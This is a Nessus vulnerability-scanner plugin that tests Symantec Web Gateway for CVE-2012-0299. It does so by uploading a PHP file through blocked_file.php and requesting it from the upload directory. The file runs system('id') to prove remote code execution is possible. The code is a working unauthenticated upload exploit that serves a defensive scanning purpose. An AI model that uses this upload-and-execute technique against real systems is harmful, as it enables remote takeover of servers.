#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(59210);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/12/14 20:33:27 $");

  script_cve_id("CVE-2012-0299");
  script_bugtraq_id(53443);
  script_osvdb_id(82025);
  script_xref(name:"TRA", value:"TRA-2012-03");

  script_name(english:"Symantec Web Gateway upload_file() Remote Code Execution (SYM12-006) (intrusive check)");
  script_summary(english:"Tries to upload & request a PHP file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web security application hosted on the remote web server has a
remote code execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server is hosting a version of Symantec Web Gateway
with a code execution vulnerability.  The upload_file() function of
util_functions.php allows PHP files to be uploaded to a directory where
the web server can execute them.  This function is used by multiple PHP
scripts that can be requested without authentication.  A remote,
unauthenticated attacker could exploit this to execute arbitrary code.
Achieving root command execution is trivial."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2012-03");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-12-091");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/523065/30/0/threaded");
  # http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?337b743c");
  script_set_attribute(attribute:"solution", value:"Upgrade to Symantec Web Gateway 5.0.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Symantec Web Gateway 5.0.2 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Symantec Web Gateway 5.0.2.8 Arbitrary PHP File Upload Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symantec:web_gateway");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("symantec_web_gateway_detect.nasl");
  script_require_keys("www/symantec_web_gateway");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:443, php:TRUE);
install = get_install_from_kb(appname:'symantec_web_gateway', port:port, exit_on_fail:TRUE);

boundary = '----nessus';
url = install['dir'] + '/blocked_file.php';
now = unixtime();
php = '<?php print_r("' + now + '\\n"); system("id"); ?>';
postdata = '--' + boundary + '\r
Content-Disposition: form-data; name="submitted"\r
\r
1\r
--' + boundary + '\r
Content-Disposition: form-data; name="new_image"; filename="payload.php"\r
Content-Type: text/plain\r
\r
' + php + '\r
\r
--' + boundary + '--\r\n';
res = http_send_recv3(
  method:'POST',
  port:port,
  item:url,
  content_type:'multipart/form-data; boundary=' + boundary,
  data:postdata,
  exit_on_fail:TRUE
);
script_creation = http_last_sent_request();

url = install['dir'] + '/images/upload/temp/temp.php';
res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

if(now >!< res[2] || !egrep(pattern:'uid=[0-9]+.*gid=[0-9]+.*', string:res[2]))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Symantec Web Gateway', build_url(qs:install['dir'], port:port));

if (report_verbosity > 0)
{
  report =
    '\nNessus uploaded a PHP file by sending the following request :\n\n' +
    crap(data:"-", length:30)+' Request '+ crap(data:"-", length:30)+'\n'+
    chomp(script_creation) + '\n' +
    crap(data:"-", length:30)+' Request '+ crap(data:"-", length:30)+'\n'+
    '\nThis file executes the "id" command and is located at :\n\n' +
    build_url(qs:url, port:port) + '\n';

  if (report_verbosity > 1)
    report += '\nRequesting this file returned the following output :\n\n' + chomp(res[2]) + '\n';

  security_hole(port:port, extra:report);
}
else security_hole(port);

